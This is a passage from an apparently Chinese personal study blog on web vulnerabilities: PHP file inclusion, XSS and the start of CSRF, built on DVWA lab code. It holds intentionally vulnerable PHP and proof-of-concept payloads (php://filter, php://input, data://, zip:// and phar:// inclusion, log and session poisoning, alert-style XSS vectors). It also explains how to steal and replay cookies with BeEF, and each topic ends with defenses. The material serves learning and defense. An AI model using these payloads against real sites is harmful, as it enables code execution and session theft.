<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>


        <h4 id="①本地文件包含"   >
          <a href="#①本地文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#①本地文件包含" class="headerlink" title="①本地文件包含"></a>①本地文件包含</h4>
      <p>即包含服务器本身的文件。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/index.php?file=test.txt</span><br></pre></td></tr></table></div></figure>


        <h4 id="②远程文件包含"   >
          <a href="#②远程文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#②远程文件包含" class="headerlink" title="②远程文件包含"></a>②远程文件包含</h4>
      <p>利用<code>URL</code>，使得网络中的可访问文件被包含，不过需要在<code>php.ini</code>中开启如下配置项</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen = on(默认开启)</span><br><span class="line">allow_url_include = on(php5.2以后默认关闭)</span><br></pre></td></tr></table></div></figure>

<p>如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/index.php?file=www.baidu.com</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-其他利用方式"   >
          <a href="#3-其他利用方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-其他利用方式" class="headerlink" title="(3)其他利用方式"></a>(3)其他利用方式</h3>
      
        <h4 id="①包含日志文件"   >
          <a href="#①包含日志文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#①包含日志文件" class="headerlink" title="①包含日志文件"></a>①包含日志文件</h4>
      <ul>
<li>利用原理</li>
</ul>
<p>输入<code>URL</code>时，输入相关的<code>php</code>代码使之报错，随即就会将相关的报错信息输入到<code>log</code>中，那么就可以将<code>php</code>的相关代码输入到日志中，那么我们包含该日志就会执行到该代码。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/index.php?file=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601174400213.png" alt="image-20220601174400213"></p>
<ul>
<li><p>利用条件：</p>
<ul>
<li>日志文件可读</li>
<li>知道日志文件的存储目录</li>
</ul>
</li>
<li><p>常见的日志文件目录：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601174509112.png" alt="image-20220601174509112"></p>
</li>
</ul>
<p>并且一般情况下日志存储目录会被修改，需要读取服务器的相关配置文件（<code>httpd.conf</code>,<code>nginx.conf</code>等），或者依据<code>phpinfo()</code>来获取。</p>
<p>相关的日志信息也可以被调整，限制。</p>

        <h4 id="②包含Session"   >
          <a href="#②包含Session" class="heading-link"><i class="fas fa-link"></i></a><a href="#②包含Session" class="headerlink" title="②包含Session"></a>②包含<code>Session</code></h4>
      <ul>
<li><p>条件：</p>
<ul>
<li><p><code>Session</code>中存在可控变量</p>
</li>
<li><p><code>Session</code>文件可以读写，并且知道存储路径</p>
</li>
</ul>
</li>
<li><p>默认存储路径：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601203337176.png" alt="image-20220601203337176"></p>
</li>
</ul>
<p>相关的<code>index.php</code>如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="variable">$username</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>输入<code>username</code>会记录<code>Session</code>，以序列化的形式存在，可以在<code>php.ini</code>中找到相关的保存路径</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601202513684.png" alt="image-20220601202513684"></p>
<p>那么访问即可获得<code>Session</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601202712181.png" alt="image-20220601202712181"></p>
<p>这样就可以尝试将该文件使用文件包含的形式来执行代码。</p>

        <h3 id="4-伪协议"   >
          <a href="#4-伪协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-伪协议" class="headerlink" title="(4)伪协议"></a>(4)伪协议</h3>
      <p>使用伪协议可以访问<code>PHP</code>的相关文件描述符，从而进行读取解析文件。</p>

        <h4 id="①使用例子"   >
          <a href="#①使用例子" class="heading-link"><i class="fas fa-link"></i></a><a href="#①使用例子" class="headerlink" title="①使用例子"></a>①使用例子</h4>
      <p>比如有时候直接文件包含不能够打印结果，比如说某个<code>test.php</code>，内容如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;aaaa&quot;</span>;</span><br><span class="line">	<span class="comment">//flag&#123;cccc&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>那么当<code>include</code>文件包含进入之后，解析<code>PHP</code>代码，只会输出<code>aaaa</code>，而不会输出<code>flag&#123;cccc&#125;</code>的内容，这时候就需要用到伪协议<code>php://filert</code>来将文件流包含进来，这样就会打印出<code>test.php</code>文件了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601210615644.png" alt="image-20220601210615644"></p>
<p>使用伪协议：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601210629504.png" alt="image-20220601210629504"></p>
<p><code>Burpsuite</code>解码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601210654804.png" alt="image-20220601210654804"></p>

        <h4 id="②各种伪协议"   >
          <a href="#②各种伪协议" class="heading-link"><i class="fas fa-link"></i></a><a href="#②各种伪协议" class="headerlink" title="②各种伪协议"></a>②各种伪协议</h4>
      <ul>
<li><p><code>php://filter</code></p>
<p>通常用来读取文件</p>
<ul>
<li><p><code>php.ini</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=off/on</span><br><span class="line">allow_url_include=off/on</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>POC</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=test.php</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
<li><p><code>php://input</code></p>
<p>将<code>POST</code>请求的相关数据当作一个文件流输入进去，配合文件包含通常可以执行任意命令。</p>
<ul>
<li><p><code>php.ini</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=off/on</span><br><span class="line">allow_url_include=on</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>POC</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://input</span><br><span class="line">[POST DATA]&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
<li><p><code>zip://</code></p>
<p>访问压缩包里的文件，访问到的文件结合文件包含函数就会被当作<code>php</code>文件执行，从而实现任意代码执行。</p>
<ul>
<li><p><code>php.ini</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=off/on</span><br><span class="line">allow_url_include=off/on</span><br><span class="line">php &gt;= 5.2</span><br></pre></td></tr></table></div></figure>

<p>需要注意的是只要是压缩包即可，后缀名无所谓。相同类型的还要<code>zlib://</code>和<code>bzip2://</code></p>
</li>
<li><p><code>POC</code>：</p>
<p><code>#</code>需要进行<code>URL</code>编码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip://[压缩包绝对路径]#[压缩包内文件]</span><br><span class="line">?file=zip://D:\phpstudy_pro\WWW\test.zip%23test.php</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
<li><p><code>phar://</code></p>
<p><code>phar</code>是用来打包生成<code>php</code>项目用的，可以用相关协议进行解析，其中涉及到很多东西，比较常见的就是<code>zip</code>打包访问以及序列化、反序列的东西。</p>
<p>类似<code>zip://</code>，可以访问<code>zip</code>中的文件，并且相对路径和绝对路径都可以。</p>
<ul>
<li><p><code>php.ini</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=off/on</span><br><span class="line">allow_url_include=off/on</span><br><span class="line">php &gt;= 5.3</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>POC</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=phar://zip.jpg/phpinfo.txt</span><br><span class="line">?file=phar://D:\zip.jpg\phpinfo.txt</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
<li><p><code>data://</code></p>
<p>类似于<code>php://input</code>，让用户控制文件的输入流。</p>
<ul>
<li><p><code>php.ini</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=on</span><br><span class="line">allow_url_include=on</span><br><span class="line">php &gt;= 5.2</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>POC</code>：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data://[&lt;MIME-type&gt;][;charset=&lt;encoding&gt;][;base64],&lt;data&gt;</span><br><span class="line">?file=data://,&lt;?php phpinfo();</span><br><span class="line">?file=data://text/plain,&lt;?php phpinfo();</span><br><span class="line">?file=data://text/plain;base64,[content]</span><br><span class="line">?file=data:text/plain,&lt;?php phpinfo();</span><br><span class="line">?file=data:text/plain;base64,[content]</span><br></pre></td></tr></table></div></figure></li>
</ul>
</li>
</ul>

        <h3 id="5-防御"   >
          <a href="#5-防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-防御" class="headerlink" title="(5)防御"></a>(5)防御</h3>
      <ul>
<li><code>allow_url_include</code>和<code>allow_url_fopen</code>最小权限化</li>
<li>设置<code>open_basedir</code>将<code>php</code>所能打开的文件限制在指定的目录树中</li>
<li>白名单限制包含文件，或者严格过滤<code>./\</code></li>
</ul>

        <h2 id="漏洞SQL注入"   >
          <a href="#漏洞SQL注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞SQL注入" class="headerlink" title="漏洞SQL注入"></a>漏洞SQL注入</h2>
      <p>了解基本原理，各种利用方式，盲注，时间盲注，布尔盲注，堆叠注入之类的，也差不多会，但是种类太多啦。而且感觉这种类型，工具比实际的感觉会好用一些。此外由于现今数据库很多都开始使用模型来获取制造SQL语句，很难利用了，所以笔记就没有怎么记录。</p>

        <h2 id="漏洞XSS"   >
          <a href="#漏洞XSS" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞XSS" class="headerlink" title="漏洞XSS"></a>漏洞XSS</h2>
      <p>跨站脚本(<code>Cross Site Scripting</code>)攻击，为了不和<code>CSS</code>产生歧义，所以缩写为<code>XSS</code>。</p>
<p>攻击者可以在页面插入恶意脚本（<code>JavaScript</code>）代码，受害者访问页面时，浏览器解析执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶意代码等行为。</p>
<p><code>XSS</code>即注入<code>HTML</code>代码</p>

        <h3 id="1-种类"   >
          <a href="#1-种类" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-种类" class="headerlink" title="(1)种类"></a>(1)种类</h3>
      
        <h4 id="①存储型"   >
          <a href="#①存储型" class="heading-link"><i class="fas fa-link"></i></a><a href="#①存储型" class="headerlink" title="①存储型"></a>①存储型</h4>
      <p>较为持久，一般在留言板、用户发帖、用户回帖的版块中，一般类似如下三步：</p>
<ul>
<li>插入留言：恶意代码数据存储到数据库中</li>
<li>查看留言：恶意代码数据从数据库中提取出来</li>
<li>内容在页面显示</li>
</ul>
<p><code>DVWA</code>的<code>Low Security</code>版本代码如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="comment">//基本没有过滤</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="comment">//插入到数据库中</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>那么就直接将恶意代码插入了数据库，不同的<code>DVWA Security</code>如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609104504618.png" alt="image-20220609104504618"></p>
<p>之后在解析的时候</p>
<p>没有过滤的直接解析为<code>HTML</code>代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609104554318.png" alt="image-20220609104554318"></p>
<p>过滤的信息被解析为相关的字符串</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609104633495.png" alt="image-20220609104633495"></p>

        <h4 id="②反射型"   >
          <a href="#②反射型" class="heading-link"><i class="fas fa-link"></i></a><a href="#②反射型" class="headerlink" title="②反射型"></a>②反射型</h4>
      <p>插入的数据不存储和读取数据库，直接回显到页面上，通常需要诱导用户去点击触发漏洞的地方。</p>
<p><code>DVWA</code>的<code>Low Security</code>版本代码如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="comment">//获取输入然后拼接字符串直接作为HTML代码输出</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>浏览器中解析如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609105153708.png" alt="image-20220609105153708"></p>

        <h4 id="③DOM型"   >
          <a href="#③DOM型" class="heading-link"><i class="fas fa-link"></i></a><a href="#③DOM型" class="headerlink" title="③DOM型"></a>③DOM型</h4>
      <p>比较少见，通过修改页面中的DOM节点，与客户端上的<code>JavaScript</code>进行交互，不会与服务端进行交互，通常是<code>document.write</code>函数</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> lang = <span class="built_in">document</span>.location.href.substring(<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line">	<span class="comment">//直接获取并且拼接，然后就document.write来写到整个HTML页面中</span></span><br><span class="line">	<span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br><span class="line">	<span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>没有写入其他的如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609140222567.png" alt="image-20220609140222567"></p>
<p>当从URL加入其他的拼接字符，其结构点发生变化，写入了我们的<code>JS</code>代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609140308956.png" alt="image-20220609140308956"></p>

        <h3 id="2-危害攻击"   >
          <a href="#2-危害攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-危害攻击" class="headerlink" title="(2)危害攻击"></a>(2)危害攻击</h3>
      <ul>
<li>钓鱼，可以伪造登录框和页面</li>
<li>Cookie盗取</li>
<li>获取IP</li>
<li>站点重定向</li>
<li><code>BOM/DOM</code>的操作</li>
<li>获取客户端的页面信息，比如窃取邮件内容</li>
<li><code>XSS</code>蠕虫，可以自我传播</li>
</ul>

        <h3 id="3-挖掘"   >
          <a href="#3-挖掘" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-挖掘" class="headerlink" title="(3)挖掘"></a>(3)挖掘</h3>
      <p>输入输出点，有的转义、过滤、消毒的等需要处理</p>

        <h3 id="4-触发漏洞"   >
          <a href="#4-触发漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-触发漏洞" class="headerlink" title="(4)触发漏洞"></a>(4)触发漏洞</h3>
      <ul>
<li><p>在<code>script</code>标签插入</p>
<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></div></figure></li>
<li><p>在事件中插入</p>
<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">javascript:alert(1);</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>在该方式下，<code>src</code>读取不到资源，就会触发后面的<code>javascript</code>代码，即<code>alert(1)</code></p>
</li>
<li><p>在协议中插入</p>
<figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1);&quot;</span>&gt;</span>点此查看链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>点击这里就会跳转<code>href</code>中进行执行<code>javascript</code>代码</p>
</li>
<li><p>等等</p>
</li>
</ul>

        <h3 id="▲XSS的Payload大全："   >
          <a href="#▲XSS的Payload大全：" class="heading-link"><i class="fas fa-link"></i></a><a href="#▲XSS的Payload大全：" class="headerlink" title="▲XSS的Payload大全："></a>▲XSS的Payload大全：</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" >Cross-Site Scripting (XSS) Cheat Sheet - 2022 Edition | Web Security Academy (portswigger.net)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="▲XSS的题目大全"   >
          <a href="#▲XSS的题目大全" class="heading-link"><i class="fas fa-link"></i></a><a href="#▲XSS的题目大全" class="headerlink" title="▲XSS的题目大全"></a>▲XSS的题目大全</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xss.haozi.me/#/0x00" >alert(1) (haozi.me)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="5-XSS攻击平台"   >
          <a href="#5-XSS攻击平台" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-XSS攻击平台" class="headerlink" title="(5)XSS攻击平台"></a>(5)XSS攻击平台</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/firesunCN/BlueLotus_XSSReceiver" >firesunCN/BlueLotus_XSSReceiver (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，这个通常用来自定义<code>payload</code>，然后进行上线</p>
<p><code>Kali</code>下的<code>Beef</code>，有很多的模块，社工弹窗等，还挺全</p>

        <h3 id="Cookie盗取"   >
          <a href="#Cookie盗取" class="heading-link"><i class="fas fa-link"></i></a><a href="#Cookie盗取" class="headerlink" title="Cookie盗取"></a>Cookie盗取</h3>
      <p>使用<code>beef</code>的<code>hook.js</code>使得客户端执行恶意的<code>JS</code>代码后，会在<code>beef</code>中收到一些信息，其中就可以提取相关网站的<code>cookie</code>，之后使用无痕模式，将<code>Cookie</code>在<code>F12-&gt;App-&gt;Cookie-&gt;对应网站</code>下，修改填入相关盗取的<code>Cookie</code>即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609173011737.png" alt="image-20220609173011737"></p>

        <h3 id="6-防御"   >
          <a href="#6-防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-防御" class="headerlink" title="(6)防御"></a>(6)防御</h3>
      
        <h4 id="①代码防御"   >
          <a href="#①代码防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#①代码防御" class="headerlink" title="①代码防御"></a>①代码防御</h4>
      <p>在服务器的输入输出处理的时候使用过滤、编码、转移之类的，或者<code>HttpOnly</code>头来禁止<code>JS</code>代码读取<code>Cookie</code>。</p>

        <h4 id="②安全设备"   >
          <a href="#②安全设备" class="heading-link"><i class="fas fa-link"></i></a><a href="#②安全设备" class="headerlink" title="②安全设备"></a>②安全设备</h4>
      <p><code>WAF</code>和<code>IDS</code></p>

        <h4 id="③控制客户端输入规则"   >
          <a href="#③控制客户端输入规则" class="heading-link"><i class="fas fa-link"></i></a><a href="#③控制客户端输入规则" class="headerlink" title="③控制客户端输入规则"></a>③控制客户端输入规则</h4>
      <p>检测相关的输入</p>

        <h2 id="漏洞CSRF"   >
          <a href="#漏洞CSRF" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞CSRF" class="headerlink" title="漏洞CSRF"></a>漏洞CSRF</h2>
      <p>CSRF（<code>Cross Site Request Forgery</code>），跨站点伪造请求。即攻击者在用户已经登录目标网站之后，诱导用户访问一个攻击者制造的攻击页面，利用用户身份对目标网站发起伪造用户身份操作的请求，相当于伪造用户。这个过程中没有盗取<code>Cookie</code>而是直接利用用户的<code>Cookie</code>来达到伪造用户身份的目的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220610150042385.png" alt="image-20220610150042385"></p>

        <h3 id="1-种类-1"   >
          <a href="#1-种类-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-种类-1" class="headerlink" title="(1)种类"></a>(1)种类</h3>
      
        <h4 id="GET型"   >
          <a href="#GET型" class="heading-link"><i class="fas fa-link"></i></a><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h4>
      <ul>
<li><p>无保护情况</p>
<p>当只需要进行<code>URL</code>提交即可完成功能，即只需要<code>GET</code>请求就能完成时。</p>
<p>如下，只是利用该<code>URL</code>传入参数，结合<code>Cookie</code>即可完成修改密码操作的时候。</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</span></span><br></pre></td></tr></table></div></figure>

<p>这种情况就直接伪造一个链接，诱导用户点击该链接，从而触发一个目标网站</p>
</li>
